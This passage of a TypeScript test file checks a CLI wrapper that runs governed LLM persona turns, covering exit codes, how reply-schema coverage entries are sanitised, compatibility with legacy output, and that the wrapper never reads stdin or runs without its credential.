    });
    expect(cited.exitCode).toBe(EXIT_GOVERNED);
    expect((JSON.parse(cited.stdout) as PersonaTurnResponse).groundingConformance?.verdict).toBe("ALLOW");
  });

  it("a governance failure still outranks the reply contract: an ungoverned turn with a perfect reply is exit 1, not 3", async () => {
    const outcome = await runPersonaTurn(baseArgs({ replySchema: "deliberate", groundingDocIds: ["release-policy", "bug-tracker"] }), {
      driver: fakeDriver(async () => {}, deliberateResult(DELIBERATE_OK)),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_UNGOVERNED);
    expect(outcome.stdout).toBe("");
  });
});

describe("runPersonaTurn --reply-schema deliberate-synthesis — coverage", () => {
  const synthesisOk = {
    ...DELIBERATE_OK,
    cited_docs: [],
    coverage: [
      { persona: "cfo", position_restated: "Ship, revenue matters", argument_words_seen: 212 },
      { persona: "ciso", position_restated: "Hold", argument_words_seen: 180 },
    ],
  };

  it("emits coverage sanitized the gateway's way: unnamed/malformed entries dropped, missing sub-fields defaulted, never a refusal", async () => {
    const messy = {
      ...synthesisOk,
      coverage: [
        synthesisOk.coverage[0],
        { persona: "ciso" }, // sub-fields missing → defaulted
        { position_restated: "no persona named" }, // dropped
        "not an object", // dropped
        { persona: "", argument_words_seen: 5 }, // empty persona → dropped
        { persona: "cto", position_restated: 42, argument_words_seen: "many" }, // wrong types → defaulted
      ],
    };
    const outcome = await runPersonaTurn(baseArgs({ replySchema: "deliberate-synthesis" }), {
      driver: fakeDriver(fireAnswerTurn, deliberateResult(messy)),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_GOVERNED);
    const response = JSON.parse(outcome.stdout) as PersonaTurnResponse;
    expect(response.replySchema).toBe("deliberate-synthesis");
    expect(response.coverage).toEqual([
      { persona: "cfo", position_restated: "Ship, revenue matters", argument_words_seen: 212 },
      { persona: "ciso", position_restated: "", argument_words_seen: 0 },
      { persona: "cto", position_restated: "", argument_words_seen: 0 },
    ]);
  });

  it("coverage is always present for synthesis (as [] when the model omitted it) and never present for plain deliberate, even if the model volunteers one", async () => {
    const omitted = await runPersonaTurn(baseArgs({ replySchema: "deliberate-synthesis" }), {
      driver: fakeDriver(fireAnswerTurn, deliberateResult({ ...DELIBERATE_OK, cited_docs: [] })),
      env: ENV_WITH_KEY,
    });
    expect(omitted.exitCode).toBe(EXIT_GOVERNED);
    expect((JSON.parse(omitted.stdout) as PersonaTurnResponse).coverage).toEqual([]);

    const volunteered = await runPersonaTurn(baseArgs({ replySchema: "deliberate" }), {
      driver: fakeDriver(fireAnswerTurn, deliberateResult(synthesisOk)),
      env: ENV_WITH_KEY,
    });
    expect(volunteered.exitCode).toBe(EXIT_GOVERNED);
    expect("coverage" in (JSON.parse(volunteered.stdout) as PersonaTurnResponse)).toBe(false);
  });
});

describe("regression — without --reply-schema the wrapper is byte-for-byte what it was", () => {
  /** The success envelope's key set and ORDER before --reply-schema existed (README "Success stdout"). */
  const LEGACY_KEYS = ["reply", "replyDigest", "governed", "model", "stopReason", "correlationId", "turnCount", "turns", "ledger"];

  it("parses legacy argv to the legacy fields plus inert defaults, and never a replySchema key", () => {
    const args = parseWrapperArgs([...LEGACY_ARGV, "--persona", "P", "--grounding", "G"]);
    expect("replySchema" in args).toBe(false);
    expect(args.groundingDocIds).toEqual([]);
    expect(args.citationRequired).toBe(false);
  });

  it("hands Pi the persona and grounding untouched (no scaffold), and emits exactly the legacy keys in the legacy order — even when the reply happens to be deliberate JSON", async () => {
    const seen: DriverInput[] = [];
    const outcome = await runPersonaTurn(baseArgs({ persona: "You are the CFO.", grounding: "[doc:budget]\nQ3 is tight." }), {
      driver: fakeDriver(fireAnswerTurn, deliberateResult(DELIBERATE_OK), seen),
      env: ENV_WITH_KEY,
    });
    expect(outcome.exitCode).toBe(EXIT_GOVERNED);
    expect(seen[0]!.systemPrompt).toBe("You are the CFO.");
    expect(seen[0]!.appendSystemPrompt).toBe("[doc:budget]\nQ3 is tight.");
    expect(seen[0]!.systemPrompt).not.toContain("GOVERNED deliberation agent");
    const response = JSON.parse(outcome.stdout) as Record<string, unknown>;
    expect(Object.keys(response)).toEqual(LEGACY_KEYS);
    expect(outcome.stdout).not.toContain("replySchema");
    expect(outcome.stdout).not.toContain("groundingConformance");
    // And the free-text contract is untouched: a non-JSON reply is still a governed success.
    const prose = await runPersonaTurn(baseArgs(), { driver: fakeDriver(fireAnswerTurn, OK_RESULT), env: ENV_WITH_KEY });
    expect(prose.exitCode).toBe(EXIT_GOVERNED);
    expect(Object.keys(JSON.parse(prose.stdout) as Record<string, unknown>)).toEqual(LEGACY_KEYS);
  });
});

describe("the wrapper as a process (bun on the TypeScript source)", () => {
  const cli = resolve(import.meta.dir, "..", "src", "wrapper-cli.ts");

  it("never touches stdin — structurally", () => {
    for (const file of ["wrapper-cli.ts", "wrapper-pi-driver.ts"]) {
      // The bridge leaves stdin open and unended; a wrapper that reads it hangs until SIGKILL.
      const source = readFileSync(resolve(import.meta.dir, "..", "src", file), "utf8");
      expect(source).not.toMatch(/process\.stdin|\/dev\/stdin|readSync\(0|stdin\.read/);
    }
  });

  it("exits 2 with usage on stderr and NOTHING on stdout for bad argv", () => {
    const result = spawnSync("bun", [cli, "--prompt", "x"], { encoding: "utf8", env: { PATH: process.env.PATH! } });
    expect(result.status).toBe(EXIT_USAGE);
    expect(result.stdout).toBe("");
    expect(result.stderr).toMatch(/--cwd is required/);
  });

  it("exits 2 before loading Pi when the credential is absent from a bridge-shaped (stripped) env", () => {
    const result = spawnSync(
      "bun",
      [cli, "--prompt", "x", "--cwd", workspace, "--model", "anthropic/claude-sonnet-4-5", "--signing-key", keyPath, "--ledger", join(root, "never.jsonl")],
      // The bridge hands the child ONLY the token env var (here: none). PATH is needed to find
      // `bun` for spawnSync itself; the wrapper does not consult it.
      { encoding: "utf8", env: { PATH: process.env.PATH! } },
    );
    expect(result.status).toBe(EXIT_USAGE);
    expect(result.stdout).toBe("");
    expect(result.stderr).toContain(DEFAULT_API_KEY_ENV);
  });
});
